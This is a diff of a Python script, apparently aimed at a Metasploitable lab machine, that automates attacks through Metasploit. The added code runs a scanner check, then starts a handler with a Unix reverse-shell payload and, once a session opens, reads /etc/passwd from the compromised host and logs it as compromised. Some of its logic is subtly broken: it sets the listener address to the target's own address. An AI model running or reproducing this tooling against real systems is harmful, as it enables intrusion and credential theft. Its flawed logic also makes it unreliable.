@@ -73,29 +73,57 @@ def attack(host, port):
     customize this based on the specific service and version.
     """
     try:
-        # Construct the Metasploit command (I used a generic TCP exploit as an example)
-        msf_command = "msfconsole -x 'use exploit/multi/handler; set PAYLOAD cmd/unix/reverse; set LHOST {host}; set LPORT {port}; exploit; sessions -l; exit -y'"
+
+        # auxiliary module based on the service (replace with actual module)
+        auxiliary_module = "auxiliary/scanner/ssh/ssh_version"  # Example: SSH version scanner
+        
+        # Metasploit check command (vulnerability scanner)
+        check_command = f"msfconsole -x 'use {auxiliary_module}; set RHOSTS {host}; set RPORT {port}; check; exit -y'"
+    
         # Execute the Metasploit command
-        process = subprocess.Popen(msf_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        process = subprocess.Popen(check_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         stdout, stderr = process.communicate()
         output = stdout.decode()
-        error = stderr.decode()
-        # Print the output and error messages
-        print("Metasploit Output:")
-        print(output)
-        print("Metasploit Errors:")
-        print(error)
-        # Check if the output contains a specific string indicating a successful attack
-        compromised = False
-        if "Session 1 created" in output: #Check if a session was created. *CHANGE AS NEEDED*
-            compromised = True
-        return compromised
+
+        # Check the output for vulnerability status (can change based on the module)
+        if "is vulnerable" in output or "vulnerable to" in output:  # Adjust the check as needed
+            # Proceed with the exploit if vulnerable
+            msf_command = f"msfconsole -x 'use exploit/multi/handler; set PAYLOAD cmd/unix/reverse_tcp; set LHOST {host}; set LPORT {port}; exploit; sessions -l; exit -y'"
+            # Rest of the exploit code:
+            process = subprocess.Popen(msf_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            stdout, stderr = process.communicate()
+            exploit_output = stdout.decode()
+            exploit_error = stderr.decode()
+
+            print("Metasploit Exploit Output:")
+            print(exploit_output)
+            print("Metasploit Exploit Errors:")
+            print(exploit_error)
+
+            # Check for successful session creation
+            compromised = False
+            if "Session 1 created" in exploit_output:
+                compromised = True
+                print("Target compromised!")
+                # Attempt to execute a command on the compromised session (e.g., cat /etc/passwd)
+                session_id = re.search(r"Session (\d+) created", exploit_output).group(1)
+                command_output = subprocess.run(f"msfconsole -x 'sessions -i {session_id}; cat /etc/passwd; exit -y'", shell=True, capture_output=True, text=True)
+                print("cat /etc/passwd output:")
+                print(command_output.stdout)
+            else:
+                print("Exploit failed.")
+                compromised = False
+            return compromised
+
+        else:
+            print(f"Host {host}:{port} is not vulnerable according to the check.")
+            return False
 
     except FileNotFoundError:
         print("Metasploit not found. Make sure it's in your PATH.")
         return False
     except Exception as e:
-        print("Error during Metasploit attack: {}".format(e))
+        print(f"Error during Metasploit check or attack: {e}")
         return False
     
 def main():
@@ -113,7 +141,6 @@ def main():
                     f.write("Host: {}, Port: {}, Status: Compromised\n".format(metasploitable_ip, port))
                     print("Host: {}, Port: {}, Status: Compromised".format(metasploitable_ip, port))
                 else:
-                    # f.write(f"Host: {metasploitable_ip}, Port: {port}, Status: Not Compromised\n")
                     f.write("Host: {}, Port: {}, Status: Not Compromised\n".format(metasploitable_ip, port))
                     print("Host: {}, Port: {}, Status: Not Compromised".format(metasploitable_ip, port))
         else:
